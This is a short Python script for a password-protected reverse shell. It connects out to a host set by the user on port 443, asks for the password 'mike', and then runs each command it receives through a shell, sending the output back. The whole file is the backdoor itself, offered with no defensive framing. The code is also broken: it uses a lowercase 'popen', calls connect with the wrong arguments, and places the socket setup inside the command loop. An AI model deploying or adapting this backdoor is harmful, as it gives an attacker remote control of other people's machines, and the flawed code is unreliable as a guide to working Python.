import subprocess
import socket
#Enter your host
host = " "
port = 443
#Enter your password
passwd = "mike"
def login():
    global m
    m.send("Login:  ")
    pwd = m.recv(1024)
    if pwd.strip() != passwd:
        login()
    else:
        m.send("connected #>")
        shell()

def shell():
    while True:
        data = m.recv(1024)
        if data.strip() == ":kill":
              break
        proc = subprocess.popen(data, shell =True , stdout = subprocess.PIPE, stderr =subprocess.PIPE ,stdin= subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        m.send(output)
        m.send("#>")
        m = socket.socket(socket.AF_INET,  socket.SOCK_STREAM)
        m.connect(host, port)
        login()







